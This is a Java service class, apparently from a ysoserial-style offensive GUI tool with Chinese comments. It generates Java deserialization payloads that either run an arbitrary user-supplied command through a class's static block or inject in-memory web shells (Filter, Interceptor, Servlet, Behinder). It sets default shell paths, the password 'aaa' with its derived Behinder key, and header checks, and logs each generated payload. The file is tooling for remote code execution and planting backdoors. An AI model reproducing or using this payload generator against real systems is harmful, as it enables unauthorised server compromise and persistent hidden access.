package com.mechoy.service.impl;

import com.mechoy.bean.ResponseBean;
import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.controller.HistoryController;
import com.mechoy.gadget.inter.Gadget;
import com.mechoy.service.CreateYsoserialService;
import com.mechoy.utils.ClassUtils;
import com.mechoy.utils.EncodingUtils;
import com.mechoy.utils.GadgetUtils;
import com.mechoy.utils.OutputUtils;

public class CreateYsoserialServiceImpl implements CreateYsoserialService {

    private final ResponseBean responseBean = new ResponseBean();

    @Override
    public ResponseBean generateCommand(YsoGadgetBean ysoGadgetBean) {
        // 增加一些值的基础判断，防止有些值没有输入
        if (ysoGadgetBean.getCommand().isEmpty()) {
            responseBean.setStatus(500);
            responseBean.setError("请输入命令");
            return responseBean;

        }

        // 当没有指定利用链时，命令执行通常就是直接创建一个class,然后在静态代码块中执行命令
        if (ysoGadgetBean.getGadget().equals("NoGadget")) {
            try {
                byte[] bytes = ClassUtils.generateCommandClass(ysoGadgetBean.getCommand(), ysoGadgetBean.getEchoType());
                responseBean.setResultByte(bytes);
                responseBean.setResult(OutputUtils.encoding(bytes, ysoGadgetBean.getOutputType()));
                responseBean.setStatus(200);
                printLog(ysoGadgetBean);
            } catch (Exception e) {
                responseBean.setStatus(500);
                responseBean.setError(e.getMessage());
            }

        } else {
            try {
                Gadget gadget = (Gadget) GadgetUtils.getRefObj(ysoGadgetBean);
                Object object = gadget.getObject(ysoGadgetBean);
                String result = OutputUtils.encoding(OutputUtils.objectToByte(object), ysoGadgetBean.getOutputType());
                responseBean.setResultByte(OutputUtils.objectToByte(object));
                responseBean.setStatus(200);
                responseBean.setResult(result);
                printLog(ysoGadgetBean);
            } catch (Exception e) {
                responseBean.setStatus(500);
                responseBean.setError(e.getMessage());
            }
        }
        return responseBean;
    }

    @Override
    public ResponseBean generateMemShell(YsoGadgetBean ysoGadgetBean) {
        // 增加一些值的基础判断，防止有些值没有输入
        if (ysoGadgetBean.getMemShellType().contains("Filter") || ysoGadgetBean.getMemShellType().contains("Interceptor")
                || ysoGadgetBean.getMemShellType().contains("Servlet")) {
            if (ysoGadgetBean.getMenShellPath().isEmpty()) {
                ysoGadgetBean.setMenShellPath("/mechoy");
            }
        }

        // 检查链接密码是否输入,不输入的情况下设置为aaa
        if (ysoGadgetBean.getMemShellPass().isEmpty()) {
            ysoGadgetBean.setMemShellPass("aaa");
        }

        // 当是冰蝎内存马时，连接密码需要md5加密
        // 该密钥为连接密码32位md5值的前16位，默认连接密码aaa  3d2f6eb97cae74a5
        if (ysoGadgetBean.getMemShellType().contains("Behinder")) {
            String md5 = EncodingUtils.encodingMD5(ysoGadgetBean.getMemShellPass());
            ysoGadgetBean.setMemShellPass(md5.substring(0, 16));
        }

        // 检查请求头是否输入,没有输入则为默认值
        if (ysoGadgetBean.getMemShellHeaderKey().isEmpty()) {
            ysoGadgetBean.setMemShellHeaderKey("User-Agent");
        }

        // 检查请求头的值是否输入,没有输入则为默认值
        if (ysoGadgetBean.getMemShellHeaderValue().isEmpty()) {
            ysoGadgetBean.setMemShellHeaderValue("ChromeMechoy");
        }


        if (ysoGadgetBean.getGadget().equals("NoGadget")) {
            try {
                byte[] bytes = ClassUtils.generateMemShell(ysoGadgetBean);
                responseBean.setResultByte(bytes);
                responseBean.setResult(OutputUtils.encoding(bytes, ysoGadgetBean.getOutputType()));
                responseBean.setStatus(200);
                printLog(ysoGadgetBean);
            } catch (Exception e) {
                responseBean.setStatus(500);
                responseBean.setError(e.getMessage());
            }
        } else {
            try {
                Gadget gadget = (Gadget) GadgetUtils.getRefObj(ysoGadgetBean);
                Object object = gadget.getObject(ysoGadgetBean);
                String result = OutputUtils.encoding(OutputUtils.objectToByte(object), ysoGadgetBean.getOutputType());
                responseBean.setResultByte(OutputUtils.objectToByte(object));
                responseBean.setStatus(200);
                responseBean.setResult(result);
                printLog(ysoGadgetBean);
            } catch (Exception e) {
                responseBean.setStatus(500);
                responseBean.setError(e.getMessage());
            }
        }
        return responseBean;
    }

    @Override
    public ResponseBean generateNoGadget(YsoGadgetBean ysoGadgetBean) {
        return null;
    }

    /**
     * 输出生成日志
     */
    private void printLog(YsoGadgetBean ysoGadgetBean) {
        if (ysoGadgetBean.getType().equals("CommandExecution")) {
            HistoryController.historyGenerateTextArea.appendText("反序列化生成日志：命令执行类型\n");
            HistoryController.historyGenerateTextArea.appendText("利用链: " + ysoGadgetBean.getGadget() + "\n");
            HistoryController.historyGenerateTextArea.appendText("执行命令: " + ysoGadgetBean.getCommand() + "\n");
            HistoryController.historyGenerateTextArea.appendText("回显类型: " + ysoGadgetBean.getEchoType() + "\n");
        } else if (ysoGadgetBean.getType().equals("MemoryShell")) {
            HistoryController.historyGenerateTextArea.appendText("反序列化生成日志：注入内存马\n");
            HistoryController.historyGenerateTextArea.appendText("利用链: " + ysoGadgetBean.getGadget() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马类型: " + ysoGadgetBean.getMemShellType() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马路径: " + ysoGadgetBean.getMenShellPath() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马密码: " + ysoGadgetBean.getMemShellPass() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马Key: " + ysoGadgetBean.getMemShellKey() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马校验的Header-Key: " + ysoGadgetBean.getMemShellHeaderKey() + "\n");
            HistoryController.historyGenerateTextArea.appendText("内存马校验的Header-Value: " + ysoGadgetBean.getMemShellHeaderValue() + "\n");
        }
        HistoryController.historyGenerateTextArea.appendText("生成结果: \n" + responseBean.getResult() + "\n");
        HistoryController.historyGenerateTextArea.appendText("----------------------------------------------------------------\n");
    }
}
